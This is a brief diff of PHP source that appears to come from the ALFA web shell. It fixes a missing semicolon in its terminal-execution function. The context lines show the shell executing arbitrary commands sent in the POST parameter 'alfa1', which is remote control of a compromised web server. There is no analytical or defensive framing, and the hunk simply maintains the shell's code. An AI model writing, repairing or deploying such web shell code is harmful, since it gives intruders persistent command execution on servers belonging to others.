@@ -6804,7 +6804,7 @@ function alfaterminalExec() {
     if (empty($match[1])) {
       $match[1] = $match[2];
     }
-    $current_path = alfaEx("cd ".addslashes($match[1]).$seperator.$pwd)
+    $current_path = alfaEx("cd ".addslashes($match[1]).$seperator.$pwd);
     $current_path = str_replace("\\", "/", $current_path);
   }
   $out = alfaEx($cmd.$_POST['alfa1'], true);
